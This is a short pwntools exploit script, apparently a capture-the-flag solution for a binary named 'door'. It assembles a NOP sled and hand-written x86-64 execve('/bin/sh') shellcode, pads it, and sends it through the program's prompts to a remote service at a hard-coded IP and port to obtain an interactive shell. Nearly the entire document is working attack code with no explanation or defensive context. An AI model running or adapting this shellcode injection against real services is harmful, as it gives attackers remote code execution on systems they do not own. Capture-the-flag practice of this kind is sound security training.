from pwn import*
from time import*
context(log_level = 'debug', arch = 'amd64', os = 'linux')
shellcode=asm(shellcraft.sh())
sh='''
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push 0x68
mov rax,0x732f2f2f6e69622f
push rax
mov rdi,rsp
push 0x1010101^0x6873
xor dword ptr [rsp],0x1010101
xor esi,esi
push rsi
push 8
pop rsi
add rsi,rsp
push rsi
mov rsi,rsp
xor edx,edx
push 59
pop rax
syscall
'''
sh=asm(sh)
print(len(sh))
sh=sh.ljust(0xa0,b'a')
#p=process('./door')
p=remote('101.42.48.14',8090)
#sleep(5)
p.recvuntil('home:\n')
p.sendline(str(0xa0))
p.recvuntil('mother:\n')
p.send(sh)
p.recvuntil('find:')
p.sendline(str(2))
p.interactive()
